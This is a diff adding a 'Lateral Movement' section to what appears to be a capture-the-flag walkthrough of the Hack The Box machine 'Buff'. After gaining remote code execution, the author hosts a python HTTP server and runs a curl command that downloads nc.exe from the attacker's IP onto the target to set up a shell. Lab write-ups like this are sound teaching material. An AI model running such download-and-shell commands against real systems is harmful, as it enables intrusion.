@@ -102,8 +102,35 @@ Andddd.... Bingo!! We got a RCE in the machine
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/postexp.png)
 
-
+We can see that we are user `buff\shaun`. Now lets move ahead hacker..
 
 ## Lateral Movement
+
+So now after getting a RCE we have to get a shell. There are many ways to get a shell if you have RCE in a machine. This is one of the method. So let's start with uploading a [`nc.exe`](https://eternallybored.org/misc/netcat/) in the machine.
+
+1. Host a python server in which nc.exe is present
+
+`python3 -m http.server`
+
+2. Now execute the following command after we have RCE.
+
+`cmd.exe /c curl http://10.10.14.23:8000/nc.exe -o nc.exe`
+
+```
+// cmd.exe : we are executing command prompt in the machine
+// /c      : this options will run the following command in the cmd.exe
+// curl    : Command line tool to transfer data
+// -o      : output filename  
+```
+
+We will see that we get a GET request for nc.exe in our server 
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/pyget.png)
+
+So now lets check if we have nc.exe in the system or not.
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/checknc.png)
+
+nc.exe upload successful!
 
 ## Priv Esc
